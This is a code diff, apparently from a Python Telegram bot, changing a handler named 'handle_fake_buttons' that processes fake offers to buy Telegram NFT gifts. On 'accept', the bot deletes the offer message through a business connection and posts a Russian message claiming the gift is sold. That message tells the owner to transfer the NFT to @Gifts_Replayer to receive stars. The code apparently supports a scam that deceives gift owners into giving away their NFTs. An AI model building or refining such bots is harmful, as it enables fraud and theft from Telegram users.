@@ -87,64 +87,46 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
 
     link = f"https://t.me/nft/{gift_slug}"
     pretty_name = get_pretty_name(gift_slug)
+    business_connection_id = callback.message.business_connection_id
 
     try:
+        # 1. Удаляем старое сообщение (с кнопками оффера)
+        await bot.delete_business_messages(
+            business_connection_id=business_connection_id,
+            message_ids=[callback.message.message_id]
+        )
+
+        # 2. Готовим новое сообщение в зависимости от действия
         if action == "accept":
-            # Текст для "Принять"
             new_text = (
                 f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                 f"• Передайте <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд."
             )
-            # Кнопка "Передать NFT"
             new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="Передать NFT", url=link)]
             ])
-            # ВОЗВРАЩАЕМ ПРЕВЬЮ
-            preview_options = LinkPreviewOptions(
-                url=link, 
-                show_above_text=True, 
-                prefer_large_media=True
-            )
         else:
-            # Текст для "Отклонить"
             new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
             new_keyboard = None
-            # При отклонении превью можно оставить или убрать. Оставим.
-            preview_options = LinkPreviewOptions(
-                url=link, 
-                show_above_text=True, 
+
+        # 3. Отправляем НОВОЕ сообщение с анимацией
+        await bot.send_message(
+            chat_id=callback.message.chat.id,
+            text=new_text,
+            reply_markup=new_keyboard,
+            business_connection_id=business_connection_id,
+            parse_mode="HTML",
+            link_preview_options=LinkPreviewOptions(
+                url=link,
+                show_above_text=True,
                 prefer_large_media=True
             )
-
-        business_connection_id = callback.message.business_connection_id
-
-        if business_connection_id:
-            await bot.edit_message_text(
-                text=new_text,
-                chat_id=callback.message.chat.id,
-                message_id=callback.message.message_id,
-                business_connection_id=business_connection_id,
-                reply_markup=new_keyboard,
-                parse_mode="HTML",
-                link_preview_options=preview_options # <--- ПЕРЕДАЕМ НАСТРОЙКИ ПРЕВЬЮ
-            )
-        else:
-            await bot.edit_message_text(
-                text=new_text,
-                chat_id=callback.message.chat.id,
-                message_id=callback.message.message_id,
-                reply_markup=new_keyboard,
-                parse_mode="HTML",
-                link_preview_options=preview_options # <--- ПЕРЕДАЕМ НАСТРОЙКИ ПРЕВЬЮ
-            )
-
+        )
+        
         await callback.answer()
 
-    except TelegramBadRequest as e:
-        print(f"!!! ОШИБКА РЕДАКТИРОВАНИЯ: {e} !!!")
-        await callback.answer(f"Ошибка: {e}", show_alert=True)
     except Exception as e:
-        print(f"!!! НЕИЗВЕСТНАЯ ОШИБКА: {e} !!!")
+        print(f"!!! ОШИБКА: {e} !!!")
         await callback.answer("Произошла ошибка.", show_alert=True)
 
 async def main():
